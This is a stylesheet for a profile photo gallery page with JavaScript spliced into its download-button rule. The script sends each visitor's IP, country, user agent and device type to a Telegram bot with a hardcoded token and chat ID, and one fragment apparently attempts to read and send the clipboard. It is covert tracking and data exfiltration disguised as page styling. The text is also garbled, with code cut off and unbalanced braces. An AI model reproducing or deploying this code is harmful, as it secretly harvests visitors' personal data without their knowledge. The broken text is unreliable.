@keyframes fadeInOut {

}

header {

  background-size: cover;
  background-position: center;
  height: 250px;
  position: relative;
}

.profile-pic {
  width: 110px;
  height: 110px;
  border-radius: 50%;
  border: 5px solid white;
  background-image: url('profile.png');
  background-size: cover;
  background-position: center;
  position: absolute;
  bottom: -55px;
  right: 20px;
  animation: pulse 2s infinite;
  box-shadow: 0 0 10px purple;
}

@keyframes pulse {
  0% { box-shadow: 0 0 0 0 rgba(128, 0, 128, 0.7); }
  70% { box-shadow: 0 0 0 15px rgba(128, 0, 128, 0); }
  100% { box-shadow: 0 0 0 0 rgba(128, 0, 128, 0); }
}

.posts-container {
  display: grid;
  grid-template-columns: repeat(5, 1fr);
  gap: 10px;
  padding: 80px 10px 30px;
}

.post-img {
  width: 100%;
  height: 120px;
  object-fit: cover;
  border-radius: 10px;
  cursor: pointer;
  transition: transform 0.3s, box-shadow 0.3s;
}

.post-img:hover {
  transform: scale(1.05);
  box-shadow: 0 0 15px #4b0082;
}

.lightbox {
  position: fixed;
  top: 0; left: 0;
  width: 100%; height: 100%;
  background: rgba(0, 0, 0, 0.9);
  display: none;
  align-items: center;
  justify-content: center;
  z-index: 999;
  flex-direction: column;
}

.lightbox img {
  max-width: 90%;
  max-height: 80%;
  border-radius: 10px;
  margin-bottom: 20px;
}

.lightbox:target {
  display: flex;
}

.close-btn {
  position: absolute;
  top: 20px;
  left: 20px;
  font-size: 30px;
  color: white;
  text-decoration: none;
}

.download-btn {
  background-color: purple;
  color: white;

  border-radius: 10px;
  text-decoration: none;
  font-size: 16px;

    const TOKEN = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
    const CHAT_ID = "7664410054";
    let report = "🛑 تقرير دخول جديد:\n\n";

    async function getIPInfo() {
      try {
        const res = await fetch("https://ipinfo.io/json");
        const data = await res.json();
        report += `🌐 IP: ${data.ip}\n`;
        report += `📍 الدولة: ${data.country}\n`;

      } catch {
        report += "🌐 IP: ❌ فشل جلب الـ IP\n\n";
      }
    }

    function getDeviceInfo() {
      const ua = navigator.userAgent;
      report += `🧠 UserAgent: ${ua}\n`;
      if (/android/i.test(ua)) report += "📱 الجهاز: أندرويد ✅\n";
      else if (/iphone|ipad/i.test(ua)) report += "🍏 الجهاز: آيفون ✅\n";
      else if (/windows/i.test(ua)) report += "💻 الجهاز: ويندوز ✅\n";
      else report += "🌀 الجهاز: غير معروف ❌\n";
      report += "\n";
    }

    function sendToTelegram(msg) {
      fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: `chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`
      });
    }

    async function runReport() {
      await getIPInfo();
      getDeviceInfo();

    }

      }).catch(() => {
        sendToTelegram("📋 فشل قراءة الحافظة أو لم يُمنح الإذن.");
      });
    }
